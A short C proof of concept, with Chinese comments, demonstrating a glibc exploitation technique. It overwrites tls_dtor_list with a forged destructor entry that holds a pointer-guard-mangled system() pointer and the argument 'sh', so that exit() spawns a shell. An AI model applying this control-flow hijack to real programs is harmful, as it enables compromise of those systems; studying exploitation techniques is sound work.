#include <stdlib.h>
// rsp改到tls_dtor_list地址以覆盖为chunk_addr
// 伪造[chunk]为ptr->((system xor fs:0x30)rol 0x11)
// 伪造[chunk + 8]为ptr->'sh'

long rol(long value, unsigned int bits) {
    return (value << bits) | (value >> (64 - bits));
}

int main()
{
    long libc_base = (long)&exit - 0x47b90;
    long tls_base = libc_base - 0x3000;
    long fs30 = *(long*)(tls_base+0x740+0x30);
    long cur = tls_base+0x740-80;
    long system_wrap = rol(((long)&system^fs30), 0x11);
    long sh_adr = cur + 0x18;
    *(long*)(cur) = cur + 0x8;
    *(long*)(cur + 0x8) = system_wrap;
    *(char**)(cur + 0x10) = "sh";
// cur -> cur+0x10
// sh_adr(cur+0x18)
// system_wrap
// sh
    exit(0);
}